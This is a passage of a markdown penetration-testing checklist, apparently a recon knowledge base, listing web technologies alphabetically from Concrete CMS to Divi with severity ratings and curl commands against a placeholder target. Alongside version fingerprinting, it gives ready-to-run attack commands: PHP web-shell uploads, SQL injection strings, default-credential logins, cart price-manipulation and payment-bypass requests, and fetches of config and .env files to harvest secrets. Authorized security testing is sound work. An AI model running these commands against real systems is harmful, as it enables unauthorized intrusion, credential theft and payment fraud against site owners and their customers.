### Check for File Upload Vulnerabilities
**Severity: 🔴 Critical**
```bash
// Concrete CMS file upload endpoints
curl -s -F "file=@shell.php" "http://target.com/index.php/tools/files/import"
curl -s -F "file=@shell.php" "http://target.com/tools/files/import"
```

**References:**
- https://documentation.concretecms.org/security

---

## Constant Contact
<!-- id: constant-contact | icon: 🛠️ | color: #e06c75 -->
Constant Contact is an email marketing platform. Exposed API keys can allow unauthorized subscriber management.

### Check for API Key Exposure
**Severity: 🟠 High**
```bash
// Search for Constant Contact API keys
curl -s http://target.com/app.js | grep -i "constantcontact\|api_key"
curl -s http://target.com/ | grep -oi "constant.contact\|ctct"
```

**References:**
- https://developer.constantcontact.com/

---

## Contact Form 7
<!-- id: contact-form-7 | icon: 🛠️ | color: #e06c75 -->
Contact Form 7 is a popular WordPress plugin. File upload bypass, path traversal, and stored XSS have been found in older versions.

### Check for Version Disclosure
**Severity: 🟡 Medium**
```bash
// Contact Form 7 version detection
curl -s http://target.com/wp-content/plugins/contact-form-7/readme.txt | grep -i "stable tag\|version"
```

### Check for File Upload Bypass
**Severity: 🟠 High**
```bash
// Test file upload with dangerous extensions
curl -s -F "file=@shell.php" "http://target.com/wp-content/plugins/contact-form-7/modules/file.php"
curl -s -F "file=@test.html" "http://target.com/wp-json/contact-form-7/v1/contact-forms/1/feedback"
```

### Check for Flamingo Database Exposure
**Severity: 🟠 High**
```bash
// Flamingo stores submitted form data
curl -s http://target.com/wp-content/plugins/flamingo/
curl -s http://target.com/wp-content/uploads/flamingo/
```

**References:**
- https://contactform7.com/

---

## Contao
<!-- id: contao | icon: 🛠️ | color: #e06c75 -->
Contao (formerly TYPOlight) is an open-source CMS. SQL injection, XSS, and path traversal vulnerabilities exist.

### Check for Exposed Installation
**Severity: 🟡 Medium**
```bash
// Contao common paths
curl -s http://target.com/contao/
curl -s http://target.com/system/
curl -s http://target.com/install.php
```

### Check for Install Lock Bypass
**Severity: 🟠 High**
```bash
// Check if install tool is accessible
curl -s http://target.com/contao/install.php
curl -s http://target.com/install/
```

### Check for Configuration Exposure
**Severity: 🔴 Critical**
```bash
// Contao config files
curl -s http://target.com/system/config/localconfig.php
curl -s http://target.com/config/localconfig.php
```

**References:**
- https://contao.org/

---

## Contentful
<!-- id: contentful | icon: 🛠️ | color: #e06c75 -->
Contentful is a headless CMS platform. Exposed API keys and delivery tokens can leak content and assets.

### Check for Exposed Contentful API Keys
**Severity: 🟠 High**
```bash
// Search for Contentful keys in client-side code
curl -s http://target.com/app.js | grep -i "contentful\|space\|accessToken"
curl -s http://target.com | grep -oE 'CF-[\w-]+'
```

### Test Content Delivery API Access
**Severity: 🟡 Medium**
```bash
// With a delivery API key, try reading all content
curl -s "https://cdn.contentful.com/spaces/SPACE_ID/entries?access_token=DELIVERY_TOKEN"
```

### Check for Contentful Webhook Exposure
**Severity: 🟠 High**
```bash
// Check if Contentful webhooks are accessible
curl -s http://target.com/contentful-webhook
curl -s http://target.com/api/contentful-webhook
```

**References:**
- https://www.contentful.com/developers/docs/concepts/security/

---

## Coppermine
<!-- id: coppermine | icon: 🛠️ | color: #e06c75 -->
Coppermine is a photo gallery CMS. Known CVEs include SQL injection, file upload bypass, and authentication bypass.

### Check for Exposed Installation
**Severity: 🟡 Medium**
```bash
// Coppermine common paths
curl -s http://target.com/cpg/
curl -s http://target.com/coppermine/
curl -s http://target.com/album/
```

### Check for Database Exposure
**Severity: 🟠 High**
```bash
// Coppermine config file
curl -s http://target.com/include/config.inc.php
curl -s http://target.com/cpg/include/config.inc.php
```

**References:**
- https://coppermine-gallery.net/

---

## Cotonti
<!-- id: cotonti | icon: 🛠️ | color: #e06c75 -->
Cotonti is an open-source CMS. SQL injection and file path disclosure are known issues.

### Check for Exposed Paths
**Severity: 🟡 Medium**
```bash
// Cotonti common paths
curl -s http://target.com/datas/
curl -s http://target.com/plugins/
curl -s http://target.com/admin/
```

**References:**
- https://www.cotonti.com/

---

## Countly
<!-- id: countly | icon: 🛠️ | color: #e06c75 -->
Countly is a web and mobile analytics platform. Exposed dashboards and API endpoints can leak user analytics data.

### Check for Exposed Dashboard
**Severity: 🟡 Medium**
```bash
// Countly default dashboard path
curl -s http://target.com:8080/
curl -s http://target.com/countly/
```

### Check for API Endpoint Exposure
**Severity: 🟠 High**
```bash
// Countly API endpoints
curl -s http://target.com/o/status
curl -s http://target.com/o/apps
curl -s http://target.com/i/apps/event
```

### Check for Default Credentials
**Severity: 🟠 High**
```bash
// Try default Countly credentials
curl -s -X POST "http://target.com/login" \
  -d "username=admin@countly&password=admin"
```

**References:**
- https://support.count.ly/

---

## CppCMS
<!-- id: cppcms | icon: 🛠️ | color: #e06c75 -->
CppCMS is a high-performance C++ web framework. Session handling and CSRF protection issues are common security concerns.

### Check for Server Header
**Severity: 🟡 Medium**
```bash
// CppCMS identifies itself in responses
curl -s -I http://target.com/ | grep -i "server"
```

**References:**
- http://cppcms.com/

---

## Craft Commerce
<!-- id: craft-commerce | icon: 🛠️ | color: #e06c75 -->
Craft Commerce is an e-commerce plugin for Craft CMS. Price manipulation, order data exposure, and privilege escalation are concerns.

### Check for Order Data Exposure
**Severity: 🟠 High**
```bash
// Check if order data is accessible without authentication
curl -s "https://target.com/commerce/orders/"
curl -s "https://target.com/commerce/my-orders"
```

### Check for Price Manipulation
**Severity: 🔴 Critical**
```bash
// Try manipulating prices in add-to-cart requests
curl -s -X POST "https://target.com/commerce/cart/update-cart" \
  -H "Content-Type: application/json" \
  -d '{"purchasableId": 123, "qty": 1, "price": 0.01}'
```

### Check for Payment Gateway Bypass
**Severity: 🔴 Critical**
```bash
// Try completing an order without payment
curl -s -X POST "https://target.com/commerce/payments/pay" \
  -d '{"orderId": 123, "gatewayId": 0, "skipGateway": true}'
```

**References:**
- https://craftcms.com/docs/commerce/security

---

## Cratejoy
<!-- id: cratejoy | icon: 🛠️ | color: #e06c75 -->
Cratejoy is a subscription commerce platform. API exposure and IDOR vulnerabilities are common concerns.

### Check for IDOR in Subscription Data
**Severity: 🟠 High**
```bash
// Test for IDOR by incrementing subscription IDs
curl -s "https://target.com/api/subscriptions/1"
curl -s "https://target.com/api/subscriptions/2"
curl -s "https://target.com/api/orders/1"
```

**References:**
- https://www.cratejoy.com/

---

## Crisp Live Chat
<!-- id: crisp-live-chat | icon: 🛠️ | color: #e06c75 -->
Crisp is a live chat platform. Website ID and API token leakage can allow unauthorized access to conversations.

### Check for Website ID Exposure
**Severity: 🟡 Medium**
```bash
// Crisp chat widget embeds the Website ID in page source
curl -s http://target.com | grep -oi "crisp\|CRISP_WEBSITE_ID\|client_id"
```

### Check for API Token Exposure
**Severity: 🟠 High**
```bash
// Search for Crisp API tokens in JavaScript
curl -s http://target.com/app.js | grep -i "crisp\|token\|identifier"
```

**References:**
- https://help.crisp.chat/en/

---

## Croogo
<!-- id: croogo | icon: 🛠️ | color: #e06c75 -->
Croogo is a CakePHP-based CMS. Default admin paths and version disclosure are common findings.

### Check for Exposed Admin Panel
**Severity: 🟡 Medium**
```bash
// Croogo admin paths
curl -s http://target.com/admin/
curl -s http://target.com/admin/users/login
```

### Check for Version Disclosure
**Severity: 🟡 Medium**
```bash
// Croogo version indicators
curl -s http://target.com | grep -i "croogo"
curl -s http://target.com/CHANGELOG.txt 2>/dev/null
```

**References:**
- https://github.com/croogo/croogo

---

## CubeCart
<!-- id: cubecart | icon: 🛠️ | color: #e06c75 -->
CubeCart is an e-commerce platform. SQL injection, authentication bypass, and file disclosure vulnerabilities exist.

### Check for Exposed Admin Panel
**Severity: 🟡 Medium**
```bash
// CubeCart admin paths
curl -s http://target.com/admin/
curl -s http://target.com/admin_login.php
```

### Check for SQL Injection
**Severity: 🔴 Critical**
```bash
// Test common CubeCart SQL injection vectors
curl -s "http://target.com/index.php?_a=product&product_id=1' OR '1'='1"
curl -s "http://target.com/category.php?cat_id=1' UNION SELECT 1,2,3,4,5--"
```

### Check for Configuration Exposure
**Severity: 🔴 Critical**
```bash
// CubeCart config file
curl -s http://target.com/includes/global.inc.php
curl -s http://target.com/ccadmin/includes/global.inc.php
```

**References:**
- https://www.cubecart.com/

---

## Chart.js
<!-- id: chartjs | icon: 🛠️ | color: #e06c75 -->
Chart.js is a JavaScript charting library. Outdated versions may have XSS vulnerabilities through chart data injection.

### Check for Version Disclosure
**Severity: 🟡 Medium**
```bash
// Check Chart.js version
curl -s http://target.com/chart.js | grep -i "version"
curl -s http://target.com/assets/chart.js | head -5
```

### Check for XSS via Chart Data
**Severity: 🟠 High**
```bash
// Chart.js renders data labels which may allow XSS
// Look for user-controlled chart data rendered without sanitization
curl -s http://target.com/ | grep -i "Chart\|new Chart"
```

**References:**
- https://www.chartjs.org/

---

## Checkout.com
<!-- id: checkout-com | icon: 🛠️ | color: #e06c75 -->
Checkout.com is a payment gateway. Exposed API keys and webhook secret leakage can allow payment tampering.

### Check for API Key Exposure
**Severity: 🔴 Critical**
```bash
// Search for Checkout.com API keys in source code
curl -s http://target.com/app.js | grep -i "checkout\|sk_\|pk_\|secret_key"
curl -s http://target.com/ | grep -oE 'sk_test_[a-zA-Z0-9]+|sk_live_[a-zA-Z0-9]+'
```

### Check for Webhook Endpoint Exposure
**Severity: 🟠 High**
```bash
// Discover exposed payment webhooks
curl -s http://target.com/webhook/checkout
curl -s http://target.com/api/webhook/checkout
```

**References:**
- https://www.checkout.com/

---

## Clearbit
<!-- id: clearbit | icon: 🛠️ | color: #e06c75 -->
Clearbit is a data enrichment API. Exposed API keys allow unauthorized access to enrichment data.

### Check for API Key Exposure
**Severity: 🟠 High**
```bash
// Search for Clearbit API keys in client-side code
curl -s http://target.com/app.js | grep -i "clearbit\|api_key"
```

**References:**
- https://clearbit.com/

---

## Clerk
<!-- id: clerk | icon: 🛠️ | color: #e06c75 -->
Clerk is a user management and authentication platform. Exposed API keys and misconfigured session tokens are security concerns.

### Check for API Key Exposure
**Severity: 🔴 Critical**
```bash
// Search for Clerk publishable/secret keys in source
curl -s http://target.com/ | grep -i "clerk\|pk_test_\|sk_test_"
curl -s http://target.com/app.js | grep -i "clerk\|CLERK"
```

**References:**
- https://clerk.com/

---

## CleverTap
<!-- id: clevertap | icon: 🛠️ | color: #e06c75 -->
CleverTap is a mobile analytics platform. Exposed account IDs and API tokens can leak user engagement data.

### Check for Account ID Exposure
**Severity: 🟡 Medium**
```bash
// CleverTap embeds account ID and token in mobile/web SDK config
curl -s http://target.com/app.js | grep -i "clevertap\|accountId\|account_id"
```

**References:**
- https://clevertap.com/

---

## ClientJS
<!-- id: clientjs | icon: 🛠️ | color: #e06c75 -->
ClientJS is a JavaScript fingerprinting library. May raise privacy concerns and be used for tracking without consent.

### Check for Privacy Compliance
**Severity: 🟡 Medium**
```bash
// Detect ClientJS fingerprinting
curl -s http://target.com/app.js | grep -i "clientjs\|ClientJS"
curl -s http://target.com/ | grep -i "new ClientJS\|getFingerprint"
```

**References:**
- https://www.clientjs.org/

---

## Cloudbeds
<!-- id: cloudbeds | icon: 🛠️ | color: #e06c75 -->
Cloudbeds is a hospitality management platform. Exposed API tokens and PII leakage are security concerns.

### Check for API Exposure
**Severity: 🟠 High**
```bash
// Cloudbeds API endpoints
curl -s http://target.com/api/cloudbeds
curl -s http://target.com/cloudbeds/
```

**References:**
- https://www.cloudbeds.com/

---

## Cloudera
<!-- id: cloudera | icon: 🛠️ | color: #e06c75 -->
Cloudera is a big data platform. Exposed management interfaces and default credentials can lead to data leakage.

### Check for Exposed Cloudera Manager
**Severity: 🔴 Critical**
```bash
// Cloudera Manager is the admin interface (port 7180/7183)
curl -s http://target.com:7180/
curl -s https://target.com:7183/
```

### Check for Hue Interface
**Severity: 🟠 High**
```bash
// Hue is the web UI for Hadoop/Cloudera (port 8888)
curl -s http://target.com:8888/
```

### Check for Default Credentials
**Severity: 🔴 Critical**
```bash
// Try default credentials
curl -s -u "admin:admin" "http://target.com:7180/api/v19/clusters"
curl -s -u "cloudera:cloudera" "http://target.com:7180/api/v19/clusters"
```

**References:**
- https://www.cloudera.com/

---

## Cloudinary
<!-- id: cloudinary | icon: 🛠️ | color: #e06c75 -->
Cloudinary is a media management platform. Origin bypass, exposed upload presets, and API key leakage are common concerns.

### Check for Origin IP Bypass
**Severity: 🟠 High**
```bash
// Cloudinary serves media via res.cloudinary.com
curl -s -I https://target.com/ | grep -i "cloudinary"
nslookup res.cloudinary.com
```

### Check for Exposed Upload Presets
**Severity: 🔴 Critical**
```bash
// Unsigned upload presets allow anyone to upload files
curl -s "https://api.cloudinary.com/v1_1/CLOUD_NAME/upload_presets"
// Try uploading directly via unsigned preset
curl -s -X POST "https://api.cloudinary.com/v1_1/CLOUD_NAME/auto/upload" \
  -F "file=@malicious.html" -F "upload_preset=UNSIGNED_PRESET"
```

### Check for API Key Exposure
**Severity: 🔴 Critical**
```bash
// Search for Cloudinary credentials in client-side code
curl -s http://target.com/app.js | grep -i "cloudinary\|cloud_name\|api_key"
```

**References:**
- https://cloudinary.com/documentation/security

---

## Cloudways
<!-- id: cloudways | icon: 🛠️ | color: #e06c75 -->
Cloudways is a managed cloud hosting platform. Server IP exposure and misconfigured firewalls are common.

### Check for Server IP Discovery
**Severity: 🟡 Medium**
```bash
// Find the real origin IP behind Cloudways proxy
curl -s -I https://target.com/ | grep -i "x-powered-by\|server"
nslookup target.com
```

**References:**
- https://www.cloudways.com/

---

## Coinhive
<!-- id: coinhive | icon: 🛠️ | color: #e06c75 -->
Coinhive was a cryptocurrency miner. Its presence (even historical) indicates a compromised or malicious site.

### Check for Coinhive Script
**Severity: 🟠 High**
```bash
// Detect Coinhive (or similar crypto miners)
curl -s http://target.com/ | grep -i "coinhive\|miner\|cryptonight"
curl -s http://target.com/app.js | grep -i "coinhive\|CoinHive"
```

**References:**
- https://en.wikipedia.org/wiki/Coinhive

---

## CometD
<!-- id: cometd | icon: 🛠️ | color: #e06c75 -->
CometD is a web messaging library. Unauthenticated channel access and information disclosure are concerns.

### Check for Exposed Endpoints
**Severity: 🟡 Medium**
```bash
// CometD common endpoints
curl -s http://target.com/cometd/
curl -s http://target.com/cometd/handshake
```

**References:**
- https://cometd.org/

---

## Comm100
<!-- id: comm100 | icon: 🛠️ | color: #e06c75 -->
Comm100 is a live chat platform. API key exposure and unauthorized chat access are concerns.

### Check for Chat Widget Exposure
**Severity: 🟡 Medium**
```bash
// Comm100 chat detection
curl -s http://target.com/ | grep -i "comm100\|livechat"
```

**References:**
- https://www.comm100.com/

---

## CommentSold
<!-- id: commentsold | icon: 🛠️ | color: #e06c75 -->
CommentSold is a social commerce platform. IDOR in order data and customer data exposure are concerns.

### Check for IDOR in Orders
**Severity: 🟠 High**
```bash
// Test for IDOR by incrementing order IDs
curl -s "https://target.com/api/orders/1000"
curl -s "https://target.com/api/orders/1001"
```

**References:**
- https://www.commentsold.com/

---

## Commento
<!-- id: commento | icon: 🛠️ | color: #e06c75 -->
Commento is a privacy-focused commenting platform. SSO bypass and API key exposure are security concerns.

### Check for Exposed Admin Interface
**Severity: 🟡 Medium**
```bash
// Commento admin paths
curl -s http://target.com/commento/
curl -s http://target.com/api/commento/
```

**References:**
- https://commento.io/

---

## Commerce Server
<!-- id: commerce-server | icon: 🛠️ | color: #e06c75 -->
Commerce Server (Microsoft) is an e-commerce platform. Exposed admin interfaces and misconfigured permissions are concerns.

### Check for Exposed Admin Paths
**Severity: 🟠 High**
```bash
// Commerce Server common paths
curl -s http://target.com/commerce/
curl -s http://target.com/CommerceServer/
```

**References:**
- https://learn.microsoft.com/en-us/commerce/

---

## Conekta
<!-- id: conekta | icon: 🛠️ | color: #e06c75 -->
Conekta is a payment gateway. Exposed API keys and webhook secrets can allow payment tampering.

### Check for API Key Exposure
**Severity: 🔴 Critical**
```bash
// Search for Conekta keys in source code
curl -s http://target.com/app.js | grep -i "conekta\|key_"
```

**References:**
- https://www.conekta.com/

---

## Contentstack
<!-- id: contentstack | icon: 🛠️ | color: #e06c75 -->
Contentstack is a headless CMS platform. Exposed API keys and management tokens can leak content.

### Check for API Key Exposure
**Severity: 🟠 High**
```bash
// Search for Contentstack API keys in client-side code
curl -s http://target.com/app.js | grep -i "contentstack\|api_key\|delivery_token"
```

**References:**
- https://www.contentstack.com/

---

## Contentsquare
<!-- id: contentsquare | icon: 🛠️ | color: #e06c75 -->
Contentsquare is a digital experience analytics platform. Exposed site IDs and script integrity issues are concerns.

### Check for Script Integrity
**Severity: 🟡 Medium**
```bash
// Detect Contentsquare analytics
curl -s http://target.com/ | grep -i "contentsquare\|tag.contentsquare"
```

**References:**
- https://www.contentsquare.com/

---

## ConvertKit
<!-- id: convertkit | icon: 🛠️ | color: #e06c75 -->
ConvertKit is an email marketing platform. Exposed API keys can allow unauthorized subscriber management.

### Check for Exposed API Keys
**Severity: 🟠 High**
```bash
// Search for ConvertKit API keys in client-side code
curl -s http://target.com/app.js | grep -i "convertkit\|api_key"
```

### Test API Key Restrictions
**Severity: 🟡 Medium**
```bash
// Test if the API key has excessive permissions
curl -s "https://api.convertkit.com/v3/subscribers?api_secret=API_SECRET"
curl -s "https://api.convertkit.com/v3/forms?api_key=API_KEY"
```

**References:**
- https://developers.convertkit.com/

---

## Cookiebot
<!-- id: cookiebot | icon: 🛠️ | color: #e06c75 -->
Cookiebot is a cookie consent platform. Domain verification bypass and script integrity are potential issues.

### Check for Cookiebot Script Integrity
**Severity: 🟡 Medium**
```bash
// Verify Cookiebot script is loaded correctly
curl -s http://target.com | grep -i "cookiebot"
curl -s https://target.com | grep -oi 'consent.cookiebot.com/uc.js'
```

### Check for CSP Compliance
**Severity: 🟡 Medium**
```bash
// Check if Cookiebot is properly configured with CSP
curl -s -I https://target.com | grep -i "content-security-policy"
```

**References:**
- https://www.cookiebot.com/en/security/

---

## CookieYes
<!-- id: cookieyes | icon: 🛠️ | color: #e06c75 -->
CookieYes is a cookie consent management platform. Script integrity and compliance issues are concerns.

### Check for Script Loading
**Severity: 🟡 Medium**
```bash
// Detect CookieYes
curl -s http://target.com | grep -i "cookieyes\|cdn-cookieyes"
```

**References:**
- https://www.cookieyes.com/

---

## Cordial
<!-- id: cordial | icon: 🛠️ | color: #e06c75 -->
Cordial is a marketing automation platform. Exposed API keys can allow unauthorized data access.

### Check for API Key Exposure
**Severity: 🟠 High**
```bash
// Search for Cordial API keys
curl -s http://target.com/app.js | grep -i "cordial\|api_key"
```

**References:**
- https://cordial.com/

---

## CoreMedia
<!-- id: coremedia | icon: 🛠️ | color: #e06c75 -->
CoreMedia is an enterprise CMS platform. Exposed admin interfaces and preview URLs can leak unpublished content.

### Check for Exposed Admin Interface
**Severity: 🟡 Medium**
```bash
// CoreMedia admin paths
curl -s http://target.com/coremedia/
curl -s http://target.com/studio/
```

### Check for Preview Content Leakage
**Severity: 🟠 High**
```bash
// CoreMedia preview URLs may expose unpublished content
curl -s http://target.com/preview/
curl -s http://target.com/blueprint/servlet/service/
```

**References:**
- https://www.coremedia.com/

---

## Coveo
<!-- id: coveo | icon: 🛠️ | color: #e06c75 -->
Coveo is an AI-powered search platform. Exposed API keys and index data leakage are security concerns.

### Check for API Key Exposure
**Severity: 🟠 High**
```bash
// Search for Coveo API keys in client-side code
curl -s http://target.com/app.js | grep -i "coveo\|api_key\|access_token"
```

**References:**
- https://www.coveo.com/

---

## Crazy Egg
<!-- id: crazy-egg | icon: 🛠️ | color: #e06c75 -->
Crazy Egg is a heatmap and analytics platform. Exposed site IDs and script integrity issues are concerns.

### Check for Script Detection
**Severity: 🟡 Medium**
```bash
// Detect Crazy Egg tracking
curl -s http://target.com/ | grep -i "crazyegg\|dnn506yrbagrg"
```

**References:**
- https://www.crazyegg.com/

---

## CreateJS
<!-- id: createjs | icon: 🛠️ | color: #e06c75 -->
CreateJS is a JavaScript suite for HTML5 content. Outdated versions may have security issues in content rendering.

### Check for Version
**Severity: 🟡 Medium**
```bash
// Detect CreateJS library
curl -s http://target.com/createjs.js | grep -i "version"
curl -s http://target.com/ | grep -i "createjs\|easeljs\|tweenjs"
```

**References:**
- https://createjs.com/

---

## Criteo
<!-- id: criteo | icon: 🛠️ | color: #e06c75 -->
Criteo is a retargeting and advertising platform. Exposed account IDs and ad integrity issues are concerns.

### Check for Account ID Exposure
**Severity: 🟡 Medium**
```bash
// Detect Criteo tags in page
curl -s http://target.com/ | grep -i "criteo\|Criteo"
```

**References:**
- https://www.criteo.com/

---

## Crowdin
<!-- id: crowdin | icon: 🛠️ | color: #e06c75 -->
Crowdin is a localization management platform. Exposed API tokens can allow unauthorized access to translation projects.

### Check for API Token Exposure
**Severity: 🟠 High**
```bash
// Search for Crowdin API tokens in source code
curl -s http://target.com/.env | grep -i "crowdin"
curl -s http://target.com/app.js | grep -i "crowdin\|CROWDIN"
```

**References:**
- https://developer.crowdin.com/

---

## Cufon
<!-- id: cufon | icon: 🛠️ | color: #e06c75 -->
Cufon is a font rendering library. It is outdated and can cause content rendering issues or be used for defacement.

### Check for Cufon Usage
**Severity: 🟡 Medium**
```bash
// Detect Cufon font replacement
curl -s http://target.com/ | grep -i "cufon\|Cufon"
```

**References:**
- https://github.com/sorccu/cufon

---

## ClickOnce
<!-- id: clickonce | icon: 🛠️ | color: #e06c75 -->
ClickOnce is a Microsoft deployment technology. Misconfigured manifests can allow arbitrary code execution.

### Check for .application Manifests
**Severity: 🟠 High**
```bash
// Discover ClickOnce deployment manifests
curl -s http://target.com/*.application
curl -s http://target.com/publish/
```

**References:**
- https://learn.microsoft.com/en-us/visualstudio/deployment/clickonce-security-and-deployment

---

## DDoS-Guard
<!-- id: ddos-guard | icon: 🛠️ | color: #e06c75 -->
DDoS-Guard is a DDoS protection and CDN service. Finding the real origin IP behind DDoS-Guard is a common objective.

### Check for Origin IP Discovery
**Severity: 🟡 Medium**
```bash
// Find real origin IP behind DDoS-Guard
curl -s -I https://target.com/ | grep -i "server\|x-forwarded"
nslookup target.com
// Check historical DNS records via SecurityTrails
curl -s "https://api.securitytrails.com/v1/domain/target.com/history/dns"
```

**References:**
- https://www.ddos-guard.net/

---

## DNN (DotNetNuke)
<!-- id: dnn-dotnetnuke | icon: 🛠️ | color: #e06c75 -->
DNN (formerly DotNetNuke) is a .NET CMS platform. SQL injection, file upload bypass, and authentication bypass have been found in older versions.

### Check for Exposed Installation
**Severity: 🟡 Medium**
```bash
// DNN common paths
curl -s http://target.com/Install/InstallWizard.aspx
curl -s http://target.com/DNNPlatform/
curl -s http://target.com/Admin/
```

### Check for SQL Injection
**Severity: 🔴 Critical**
```bash
// Known DNN SQLi vectors
curl -s "http://target.com/DesktopModules/DnnForge/NewsArticles/ViewArticle.aspx?artid=1' OR '1'='1"
```

### Check for Configuration Exposure
**Severity: 🔴 Critical**
```bash
// DNN web.config and connection strings
curl -s http://target.com/web.config
curl -s http://target.com/App_Data/
```

**References:**
- https://www.dnnsoftware.com/

---

## DSpace
<!-- id: dspace | icon: 🛠️ | color: #e06c75 -->
DSpace is an open-source repository platform. Exposed admin interfaces, authentication bypass, and XSS are common findings.

### Check for Exposed Paths
**Severity: 🟡 Medium**
```bash
// DSpace common paths
curl -s http://target.com/dspace/
curl -s http://target.com/xmlui/
curl -s http://target.com/jspui/
curl -s http://target.com/admin/
```

### Check for Authentication Bypass
**Severity: 🟠 High**
```bash
// Check if admin pages are accessible without auth
curl -s "http://target.com/xmlui/admin"
curl -s "http://target.com/jspui/admin"
```

**References:**
- https://duraspace.org/dspace/

---

## DataLife Engine
<!-- id: datalife-engine | icon: 🛠️ | color: #e06c75 -->
DataLife Engine (DLE) is a PHP CMS/news engine. SQL injection, XSS, and file upload vulnerabilities have been found.

### Check for Exposed Paths
**Severity: 🟡 Medium**
```bash
// DLE common paths
curl -s http://target.com/engine/
curl -s http://target.com/engine/inc/
curl -s http://target.com/engine/data/
```

### Check for Admin Panel
**Severity: 🟡 Medium**
```bash
// DLE admin path
curl -s http://target.com/admin.php
curl -s http://target.com/engine/admin.php
```

**References:**
- https://datalifeengine.com/

---

## Datadog
<!-- id: datadog | icon: 🛠️ | color: #e06c75 -->
Datadog is a monitoring and observability platform. Exposed API keys can allow unauthorized access to infrastructure data.

### Check for API Key Exposure
**Severity: 🔴 Critical**
```bash
// Search for Datadog API/application keys in source code
curl -s http://target.com/app.js | grep -i "datadog\|DD_API_KEY\|DD_APP_KEY"
curl -s http://target.com/.env 2>/dev/null | grep -i "datadog"
curl -s http://target.com/config.js | grep -i "datadog\|api_key"
```

**References:**
- https://docs.datadoghq.com/security/

---

## Debian
<!-- id: debian | icon: 🛠️ | color: #e06c75 -->
Debian is a Linux distribution. End-of-life versions (Debian 9, 10) miss security patches.

### Check for Version
**Severity: 🟠 High**
```bash
// Identify Debian version via HTTP headers or SSH
curl -s -I http://target.com/ | grep -i "server"
nc -nv target.com 22 2>&1 | grep -i "debian\|ubuntu"
```

**References:**
- https://www.debian.org/

---

## Decap CMS
<!-- id: decap-cms | icon: 🛠️ | color: #e06c75 -->
Decap CMS (formerly Netlify CMS) is a Git-based CMS. Exposed admin paths and API endpoint access are security concerns.

### Check for Exposed Admin
**Severity: 🟡 Medium**
```bash
// Decap CMS admin path
curl -s http://target.com/admin/
curl -s http://target.com/admin/index.html
```

### Check for Git Backend Exposure
**Severity: 🟠 High**
```bash
// Decap CMS config file may expose tokens
curl -s http://target.com/admin/config.yml
curl -s http://target.com/config.yml
```

**References:**
- https://decapcms.org/

---

## Deno
<!-- id: deno | icon: 🛠️ | color: #e06c75 -->
Deno is a JavaScript/TypeScript runtime. Outdated versions and insecure permissions in deployed apps are concerns.

### Check for Server Header
**Severity: 🟡 Medium**
```bash
// Deno runtime may reveal itself
curl -s -I http://target.com/ | grep -i "server\|deno"
```

**References:**
- https://deno.com/

---

## Detectify
<!-- id: detectify | icon: 🛠️ | color: #e06c75 -->
Detectify is a security scanning platform. Exposed API tokens can allow unauthorized scanning.

### Check for API Token Exposure
**Severity: 🟠 High**
```bash
// Search for Detectify API tokens in source
curl -s http://target.com/app.js | grep -i "detectify\|api_key\|token"
curl -s http://target.com/.env | grep -i "detectify"
```

**References:**
- https://detectify.com/

---

## DigiCert
<!-- id: digicert | icon: 🛠️ | color: #e06c75 -->
DigiCert is a certificate authority. Exposed API keys can allow unauthorized certificate issuance.

### Check for API Key Exposure
**Severity: 🔴 Critical**
```bash
// Search for DigiCert API keys
curl -s http://target.com/app.js | grep -i "digicert\|api_key"
curl -s http://target.com/.env | grep -i "digicert"
```

**References:**
- https://www.digicert.com/

---

## DigitalOcean Spaces
<!-- id: digitalocean-spaces | icon: 🛠️ | color: #e06c75 -->
DigitalOcean Spaces is S3-compatible object storage. Misconfigured bucket access and key leakage are common.

### Check for Public Bucket Access
**Severity: 🟠 High**
```bash
// DigitalOcean Spaces bucket listing
curl -s "https://bucket-name.ams3.digitaloceanspaces.com/"
curl -s "https://bucket-name.sfo3.digitaloceanspaces.com/"
curl -s "https://bucket-name.digitaloceanspaces.com/"
```

### Check for API Key Exposure
**Severity: 🔴 Critical**
```bash
// Search for DO Spaces keys
curl -s http://target.com/app.js | grep -i "spaces\|digitalocean\|DO_SPACES"
curl -s http://target.com/.env | grep -i "spaces\|digitalocean"
```

**References:**
- https://www.digitalocean.com/products/spaces/

---

## DirectAdmin
<!-- id: directadmin | icon: 🛠️ | color: #e06c75 -->
DirectAdmin is a web hosting control panel. Default credentials and exposed admin interfaces are common issues.

### Check for Exposed Admin Panel
**Severity: 🟡 Medium**
```bash
// DirectAdmin common ports and paths
curl -s https://target.com:2222/
curl -s http://target.com:2222/
curl -s https://target.com:2222/CMD_LOGIN
```

### Check for Default Credentials
**Severity: 🔴 Critical**
```bash
// Try default DirectAdmin credentials
curl -s -u "admin:admin" "https://target.com:2222/CMD_API_ADMIN"
curl -s -u "admin:directadmin" "https://target.com:2222/CMD_API_ADMIN"
```

**References:**
- https://www.directadmin.com/

---

## Directus
<!-- id: directus | icon: 🛠️ | color: #e06c75 -->
Directus is a headless CMS platform. Exposed API endpoints and authentication bypass are security concerns.

### Check for Exposed Admin
**Severity: 🟡 Medium**
```bash
// Directus admin paths
curl -s http://target.com/admin/
curl -s http://target.com/directus/
```

### Check for API Endpoint Exposure
**Severity: 🟠 High**
```bash
// Directus REST API
curl -s http://target.com/api/
curl -s http://target.com/items/users
curl -s http://target.com/server/info
```

**References:**
- https://directus.io/

---

## Discuz! X
<!-- id: discuz-x | icon: 🛠️ | color: #e06c75 -->
Discuz! X is a PHP forum/CMS platform widely used in Asia. Multiple CVEs exist for SQL injection, RCE, and file upload bypass.

### Check for Exposed Installation
**Severity: 🟡 Medium**
```bash
// Discuz! X common paths
curl -s http://target.com/forum.php
curl -s http://target.com/install/
curl -s http://target.com/uc_server/
```

### Check for SQL Injection
**Severity: 🔴 Critical**
```bash
// Known Discuz! SQLi vectors
curl -s "http://target.com/forum.php?mod=forumdisplay&fid=1' OR '1'='1"
```

### Check for Configuration Exposure
**Severity: 🔴 Critical**
```bash
// Discuz! config files
curl -s http://target.com/config/config_global.php
curl -s http://target.com/config/config_ucenter.php
```

**References:**
- https://www.discuz.vip/

---

## Disqus
<!-- id: disqus | icon: 🛠️ | color: #e06c75 -->
Disqus is a commenting platform. API key exposure and misconfigured moderation panels are concerns.

### Check for API Key Exposure
**Severity: 🟠 High**
```bash
// Search for Disqus keys in client-side code
curl -s http://target.com/ | grep -i "disqus\|disqus_shortname"
curl -s http://target.com/app.js | grep -i "disqus\|shortname"
```

**References:**
- https://disqus.com/

---

## Divi
<!-- id: divi | icon: 🛠️ | color: #e06c75 -->
Divi is a popular WordPress theme/page builder. File upload bypass, stored XSS, and privilege escalation have been found.

### Check for Version Disclosure
**Severity: 🟡 Medium**
```bash
// Divi version detection
curl -s http://target.com/wp-content/themes/Divi/style.css | grep -i "version"
```

